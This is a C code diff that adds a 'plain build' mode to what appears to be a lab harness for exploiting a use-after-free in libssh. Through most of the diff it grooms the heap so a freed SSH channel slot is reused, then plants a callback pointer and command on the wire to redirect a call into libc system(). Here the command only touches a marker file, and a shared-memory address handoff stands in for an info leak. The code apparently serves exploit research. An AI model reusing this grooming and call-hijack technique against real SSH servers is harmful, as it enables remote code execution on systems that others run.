@@ -17,6 +17,9 @@
 #include <libssh/channels.h>
 #include <libssh/ssh2.h>
 #include <libssh/packet.h>
+#ifdef W26_PLAINADDR
+#include <sys/mman.h>
+#endif
 #include <libssh/misc.h>
 
 #define PORT 42229
@@ -62,6 +65,17 @@ static uint64_t g_wirelist_chunk = 0;
  * chosen bytes on the wire; system() reads them from the recycled channel. */
 static int g_syswire = 0;
 static const char g_syswire_cmd[] = "touch evidence-wire-syswire.marker";
+#endif
+#ifdef W26_PLAINADDR
+/* W26: in a plain (non-ASan) build the recycled 128-byte slot is not
+ * deterministic across runs. The server publishes the address of the live
+ * channel object before the groom packet is sent; the client uses that
+ * address for its wire-resident callback, command and session pointer. The
+ * malloc following ssh_channel_free() must return that exact object. This
+ * is a lab-only shared-memory handoff, not an attacker primitive. */
+static int g_plainaddr = 0;
+static volatile uint64_t *g_plain_slot = NULL;
+static void *g_live_channel = NULL;
 #endif
 #ifdef W14_REALSYSTEM
 /* W14: the indirect call from channel_rcv_data() targets real libc system().
@@ -170,6 +184,13 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
                 memcpy(&v, (char *)p + 120, sizeof(v));
                 printf("SERVER groom alloc=%p wire_off120=0x%llx target=%p survive=%d\n",
                        p, (unsigned long long)v, (void *)&g_target, g_survive);
+#ifdef W26_PLAINADDR
+                if (g_plainaddr) {
+                    printf("SERVER plainaddr recycled=%p live=%p match=%d\n",
+                           p, g_live_channel, p == g_live_channel);
+                    fflush(stdout);
+                }
+#endif
                 fflush(stdout);
             }
         }
@@ -395,6 +416,15 @@ static int run_server(const char *keyfile)
                 printf("SERVER registered callbacks on channel %u\n",
                        ch->local_channel);
                 fflush(stdout);
+#ifdef W26_PLAINADDR
+                if (g_plain_slot != NULL && g_live_channel == NULL) {
+                    g_live_channel = ch;
+                    *g_plain_slot = (uint64_t)(uintptr_t)ch;
+                    printf("SERVER plainaddr published=0x%llx\n",
+                           (unsigned long long)(uintptr_t)ch);
+                    fflush(stdout);
+                }
+#endif
             }
             /* avoid an infinite loop over the same head element */
             break;
@@ -480,6 +510,21 @@ static int run_client(void)
         usleep(200000);
     }
     usleep(200000);
+#ifdef W26_PLAINADDR
+        if (g_plainaddr) {
+            int tries = 0;
+            while (*g_plain_slot == 0 && tries++ < 500) usleep(10000);
+            if (*g_plain_slot == 0) {
+                fprintf(stderr, "client plainaddr: no published slot\n");
+                return 1;
+            }
+            g_wirelist_chunk = *g_plain_slot;
+            g_wirecmd_chunk = *g_plain_slot;
+            printf("CLIENT plainaddr slot=0x%llx\n",
+                   (unsigned long long)g_wirelist_chunk);
+            fflush(stdout);
+        }
+#endif
     if (g_groom) {
         unsigned char payload[128];
         uint64_t want = (uint64_t)(uintptr_t)&g_target;
@@ -640,6 +685,9 @@ int main(int argc, char **argv)
 #ifdef W25_SYSWIRE
         fprintf(stderr, "W25 modes: %s hostkey groom-syswire CHUNK_ADDR|groom-syswire-bad CHUNK_ADDR\n", argv[0]);
 #endif
+#ifdef W26_PLAINADDR
+        fprintf(stderr, "W26 modes: %s hostkey groom-syswire-plain|groom-syswire-plain-bad\n", argv[0]);
+#endif
 #ifdef W24_WIRELIST
         fprintf(stderr, "W24 modes: %s hostkey groom-wirelist CHUNK_ADDR|groom-wirelist-bad CHUNK_ADDR\n", argv[0]);
 #endif
@@ -795,6 +843,25 @@ int main(int argc, char **argv)
         g_syswire = 1;
         g_bad_call = 1;
 #endif
+#ifdef W26_PLAINADDR
+    } else if (argc == 3 && strcmp(argv[2], "groom-syswire-plain") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_inline = 1;
+        g_wirelist = 1;
+        g_syswire = 1;
+        g_plainaddr = 1;
+    } else if (argc == 3 && strcmp(argv[2], "groom-syswire-plain-bad") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_inline = 1;
+        g_wirelist = 1;
+        g_syswire = 1;
+        g_bad_call = 1;
+        g_plainaddr = 1;
+#endif
 #ifdef W12_FIXEDADDR
     } else if (argc == 4 && strcmp(argv[2], "groom-fixedaddr") == 0) {
         g_groom = 1;
@@ -808,6 +875,18 @@ int main(int argc, char **argv)
         fprintf(stderr, "unknown mode: %s\n", argv[2]);
         return 2;
     }
+#ifdef W26_PLAINADDR
+    if (g_plainaddr) {
+        void *m = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
+                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+        if (m == MAP_FAILED) {
+            perror("mmap plainaddr");
+            return 1;
+        }
+        g_plain_slot = (volatile uint64_t *)m;
+        *g_plain_slot = 0;
+    }
+#endif
     pid = fork();
     if (pid == 0) {
         int rc = run_server(argv[1]);
